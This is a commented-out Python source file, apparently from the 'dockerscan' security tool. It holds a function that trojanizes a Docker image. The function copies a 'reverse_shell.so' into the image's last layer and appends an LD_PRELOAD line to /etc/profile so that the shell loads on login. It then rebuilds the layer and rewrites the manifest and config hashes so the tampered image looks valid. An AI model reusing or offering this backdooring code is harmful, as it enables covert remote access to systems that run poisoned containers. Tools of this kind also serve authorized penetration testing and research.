# import io
# import json
# import shutil
# import os.path
# import tarfile
# import logging
# import hashlib
# import tempfile
# from typing import List, Dict
#
# from .model import *
# from ..docker_commands import *
#
# log = logging.getLogger("dockerscan")
#
#
# def run_image_modify_trojanize_dockerscan(
#         config: DockerImageInfoModifyTrojanizeModel):
#     assert isinstance(config, DockerImageInfoModifyTrojanizeModel)
#
#     output_docker_image = config.output_image
#     image_path = config.image_path
#
#     if not output_docker_image:
#         output_docker_image = os.path.basename(config.image_path)
#     if not output_docker_image.endswith("tar"):
#         output_docker_image += ".tar"
#
#     # 1.1 - Get layers info
#     log.debug(" > Opening docker file")
#     with open_docker_image(image_path) as (
#             img, top_layer, _, manifest):
#
#         # 1.2 - Get the last layer in manifest
#         log.debug(" > Getting de last layer in the docker image")
#
#         # Layers are ordered in inverse order
#         last_layer = get_layers_ids_from_manifest(manifest)[-1]
#         log.debug(" > Last layer: {}".format(last_layer))
#
#         # 1.3 - Extract the last layer
#         with tempfile.TemporaryDirectory() as d:
#
#             log.debug(" > Extracting layer content in temporal "
#                       "dir: {}".format(d))
#             extract_docker_layer(img, last_layer, d)
#
#             # 1.4 - Trojanize
#
#             log.info(" > Starting trojaning process")
#
#             # 1.4.1 - Copy the shell
#             src_shell_path = os.path.join(os.path.dirname(__file__),
#                                           "shells",
#                                           "reverse_shell.so")
#
#             dst_shell_path = os.path.join(d, "etc/")
#             container_image_path = "/etc/reverse_shell.so"
#             container_profile_path = os.path.join(d, "etc/profile")
#
#             log.info(" > Coping the shell: 'reverse_shell.so' "
#                      "to '/etc/profile'")
#
#             if not os.path.exists(os.path.join(d, "etc")):
#                 os.makedirs(os.path.join(d, "etc"))
#
#             shutil.copy(src_shell_path,
#                         dst_shell_path)
#
#             # 1.4.2 - Add LD_PRELOAD to profile
#             log.info(" > Add LD_PRELOAD to /etc/profile")
#             with open(container_profile_path, "a") as p:
#                 p.write("export LD_PRELOAD={}\n".format(
#                     container_image_path))
#
#             # 1.5 - Build the new layer.zip from modified file
#             log.info(" > Building new layer.tar file with trojanized system")
#             new_layer_path = os.path.join(d, "new_layer.tar")
#             with tarfile.open(new_layer_path, "w") as nl:
#                 nl.add(d, arcname="/")
#
#             # 1.6 - Calculating the SHA 256 hash
#             log.info(" > Calculating new SHA256 hash for the new layer")
#             with open(new_layer_path, "rb") as f:
#                 m = hashlib.sha256()
#                 m.update(f.read())
#                 new_layer_sha256 = m.hexdigest()
#
#             log.info(" > Updating the manifest")
#             # 1.7 - Updating the manifest
#             new_manifest = manifest
#
#             # Find the old last layer
#             for i, layer_id in enumerate(new_manifest[0]["Layers"]):
#                 if last_layer in layer_id:
#                     break
#             new_manifest[0]["Layers"][i] = "{}/layer.tar" \
#                                            "".format(new_layer_sha256)
#
#             # 1.7 - Create new docker image
#             log.info(" > Creating new docker image")
#             with tarfile.open(output_docker_image, "w") as s:
#
#                 for f in img.getmembers():
#                     log.debug("    _> Processing file: {}".format(f.name))
#
#                     # Add new manifest
#                     if f.name == "manifest.json":
#                         # Dump Manifest to JSON
#                         new_manifest_json = json.dumps(new_manifest).encode()
#                         t = tarfile.TarInfo("manifest.json")
#                         t.size = len(new_manifest_json)
#
#                         s.addfile(t, io.BytesIO(new_manifest_json))
#
#                     # Add new trojanized layer
#                     elif last_layer in f.name:
#                         # Skip for old layer.tar file
#                         if "layer" in f.name:
#                             continue
#
#                         # Add the layer.tar
#                         if f.name == last_layer:
#                             log.debug(
#                                 "    _> Replacing layer {} by {}".format(
#                                     f.name,
#                                     new_layer_sha256
#                                 ))
#                             s.add(new_layer_path,
#                                   "{}/layer.tar".format(new_layer_sha256))
#                         else:
#                             #
#                             # Extra files: "json" and "VERSION"
#                             #
#                             c = img.extractfile(f).read()
#                             t = tarfile.TarInfo("{}/{}".format(
#                                 new_layer_sha256,
#                                 os.path.basename(f.name)
#                             ))
#
#                             if "json" in f.name:
#                                 # Modify the JSON content to add the new
#                                 # hash
#                                 c = c.decode(). \
#                                     replace(last_layer,
#                                             new_layer_sha256).encode()
#
#                             t.size = len(c)
#                             s.addfile(t, io.BytesIO(c))
#
#                     elif ".json" in f.name and "/" not in f.name:
#                         c = img.extractfile(f).read()
#                         t = tarfile.TarInfo(f.name)
#
#                         # Modify the JSON content to add the new
#                         # hash
#                         j = json.loads(c.decode())
#                         j["rootfs"]["diff_ids"][-1] = \
#                             "sha256:{}".format(new_layer_sha256)
#
#                         new_c = json.dumps(j).encode()
#
#                         t.size = len(new_c)
#                         s.addfile(t, io.BytesIO(new_c))
#
#                     # Add the rest of files / dirs
#                     else:
#                         s.addfile(f, img.extractfile(f))
#
#
# __all__ = ("run_image_modify_trojanize_dockerscan",)
